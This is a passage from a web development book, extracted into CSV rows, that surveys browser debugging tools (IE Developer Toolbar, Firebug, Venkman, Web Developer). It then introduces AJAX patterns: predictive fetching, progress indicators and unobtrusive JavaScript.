Larger Text,Smaller Text,Symbol
Other Internet Explorer debugging tools ,"The features that you've just seen in action in Internet Explorer 8 are powerful and 
 allow you to go a long way in debugging and profiling your code. However, it's good to 
 know there are a few other options available:
  
 •
  
 •
  
 Firebug Lite
 : Firebug is probably the most popular JavaScript debugger. 
 Initially developed for Firefox, it now comes in the Firebug Lite version, 
 which is a JavaScript file that you can use with Internet Explorer, 
  
 Opera, and Safari, to simulate the ""native"" Firebug features. Get it from 
 http://getfirebug.com/lite.html
 .
  
 Internet Explorer Developer Toolbar
 : Microsoft offers the Internet Explorer 
 Developer toolbar as an option for exploring web pages. It is especially useful for 
 working with the page's DOM element, CSS styles, cookies, and so on. It can be 
 downloaded from Microsoft's website. After its installation is complete, you can 
 open it through 
 Tools | Toolbars | Explorer Bar | IE Developer Toolbar
 .
  
 [
  193 
 ]",NA
Debugging and profiling with Firefox,"The tools available for web development in Firefox have grown along with its ever-
 increasing number of users.
  
 For starters, Firefox offers an 
 Error Console
  accessible from the 
 Tools
  menu, where 
 all the JavaScript errors, warnings, and messages are logged. It also has a built-in script 
 evaluator within the document context, and the DOM Inspector tool, which can be 
 selected at installation time.
  
 Figure 6-14 shows the Error Console signaling a typo in our code:
  
  
 Figure 6-14: The Firefox error console
  
 [
  194 
 ]",NA
Firebug,"Firebug (
 http://www.getfirebug.com/
 ) is a Firefox add-on that offers almost 
  
 anything a web developer could want from a debugging tool:
  
 •
  
 Debugging and profiling script
  
 •
  
 Monitoring HTTP traffic
  
 •
  
 Examining HTTP headers
  
 •
  
 Inspecting and editing the DOM
  
 •
  
 Inspecting and editing CSS
  
 •
  
 Quick search for filtering errors and messages
  
 Delivering such a powerful set of tools in one free product makes Firebug the perfect 
  
 choice for debugging applications in Firefox. It's worth mentioning that Firebug can 
  
 conflict with the ""JavaScript Debugger"" (Venkman—shown next) add-on for Firefox, 
  
 causing erratic behavior and spurious errors. So if you have them both (many 
  
 developers do!) you may need to turn off Firebug when using Venkman.
  
 Figure 6-15 shows Firebug in action. In this example, we loaded the same 
  
 script we used earlier for testing the debug features of Internet Explorer 8: 
  
 http://localhost/ajax/javascript/xmlhttprequest/async.html
 . 
  
  
 Figure 6-15: Using Firebug
  
 [
  195 
 ]",NA
Venkman JavaScript debugger,"The Venkman JavaScript debugger (
 http://www.mozilla.org/projects/ 
 venkman/
 ) is a powerful tool for debugging in Mozilla-based browsers (Firefox, 
 Netscape, and SeaMonkey).
  
 Like Firebug, Venkman JavaScript Debugger offers debugging and profiling, full call 
 stack, breakpoints, local variables, and watches, all within a friendly user interface. After 
 installing the tool, you can execute it from the 
 Tools|JavaScriptDebugger 
 menu item. 
 Figure 6-17 shows the tool in action:
  
  
 Figure 6-17: The Venkman debugger in action
  
 [
  197 
 ]",NA
Web Developer,"Similar to Firebug and Internet Explorer Developer Toolbar, another Firefox 
 add-on, Web Developer (
 https://addons.mozilla.org/en-US/firefox/ 
 addon/60
 ), provides a most comprehensive set of tools for:
  
 •
  
 DOM information and inspection
  
 •
  
 Outlining different elements (frames, headings, tables, links, and so on)
  
 •
  
 HTTP headers, JavaScript, and images information
  
 •
  
 Cookies
  
 •
  
 CSS
  
 •
  
 Page validation (CSS, HTML, WAI, links, and Section 508)
  
 All in all, this extension is a very good companion for developing websites. The 
 homepage for this extension and some documentation can be found at: 
 http://chrispederick.com/work/web-developer/
 .",NA
Summary,"Debugging and testing are quite complex tasks and they could be the subject of an 
 entire book. The goal of this chapter was to introduce you to the common 
 debugging tools and offer a glimpse into the world of automated testing tools for 
 AJAX applications. 
  
 With the continuous growth of AJAX applications, the need for more complex tools will 
 generate new products, so it's worth keeping an eye on what's new in this domain. You 
 will have to work at debugging and profiling at some point in your development career 
 (at least you will need to be familiar with how it's done and why) so if you're not 
 familiar with these tools and how they're used, take some time now to explore them and 
 familiarize yourself with their inner workings—the effort is well worth the time!
  
 [
  199 
 ]",NA
Advanced Patterns and ,NA,NA
Techniques,"People often ask themselves: ""
 Is there a better way to do this?
 "" And this is a good 
 question to ask! Examining implementation alternatives gives us the opportunity to 
 improve a design. Analyzing methods, patterns, and techniques is so important that this 
 practice has developed into its own science and has created a set of guidelines for 
 solving typical problems that offer us predictable results. 
  
 By applying a set of common, recognized, industry-wide accepted patterns and 
 techniques, we simplify our day-to-day tasks and end up with scalable, stable, and 
 maintainable applications. Many applications answer common needs, resulting in 
 bodies of code that provide 
 ready-made
  solutions that are easily incorporated into a 
 larger application. 
  
 Usually these ""ready-made"" solutions have already been examined and tested for their 
 efficiency and ease of use (but not always, so it's a good idea to do a little research 
 before using one). Instead of ""reinventing the wheel"" each time you write a solution to 
 a common task, it's possible to save time (and, therefore, money and aggravation) by 
 making good use of such handy approaches.",NA
Predictive fetching pattern,"The Google Maps application is probably one of the most well-known applications that 
 use predictive fetching. When a user moves around in the map (by dragging it) the 
 images of the new regions appear, ideally, without having blank spaces or delays. This 
 makes the map look and feel more like a traditional printed map and provides the user 
 with a seamless experience. 
  
 However, there are several questions that may arise:
  
 1. How much information should be fetched in anticipation of need?
  
 2. What information allows us to prefetch more efficiently?
  
 3. Who decides when prefetching begins?
  
 In order to answer the first question, let's look at another common example—a client data 
 grid. When using a data grid, a typical scenario involves operations like paging, sorting, 
 editing, and filtering. All these operations require different amounts of data to be 
 available to the grid. Paging requires only a single page that can be computed ahead based 
 on the current criteria; thus we can prefetch, for example, the pages before and ahead of 
 the current page being displayed. In this way, the user is able to move through the pages 
 very quickly without having to wait for the server response.
  
 It's relatively easy to have 100 records on a client but what about 1,000,000 records? 
 Even though only a small portion of complete data may be displayed to the user, if the 
 data is then sorted (by date, for example) we must sort all of it and not just the little bit 
 being displayed. Depending on the amount of data, it may or may not be possible to 
 have this data prefetched on the client.
  
 Based on user profiles, browsing history, or any other behavioral aspect that we might 
 decide to collect and consider, distinct prefetching approaches are suggested for 
 different users. This decision can be made on the client side by implementing business 
 logic for it or, based on some statistics, it can be decided by the server.",NA
Progress indicator pattern,"Utterances such as ""Is it working?"", ""Is anything happening?"", or ""Is it 
 doing 
  
 anything?"" are good indicators that your site is, well, unsociable, uncivilized, and 
 inspiring ire. Keeping the user in the dark is not very nice. It is very important to keep 
 him informed about what's happening on the page—especially when requests are being 
 processed; otherwise, users think you're application isn't working.
  
 [
  204 
 ]",NA
Unobtrusive JavaScript,"Unobtrusive JavaScript represents a technique that separates the JavaScript behavioral 
 code from the page's content and presentation. This greatly eases maintainability, but 
 several factors need to be carefully considered and addressed when using this 
 technique:
  
 1. JavaScript inline 
 <script>
  elements are not used; only 
 <script>
  elements 
  
 with 
 src
  attributes are used:
  
 <script type=""text/javascript"" src=""path/filename.js""></script>.
  
 2. All the JavaScript code resides in separate JavaScript files.
  
 3. No use of inline event attributes on HTML elements.
  
 [
  205 
 ]",NA
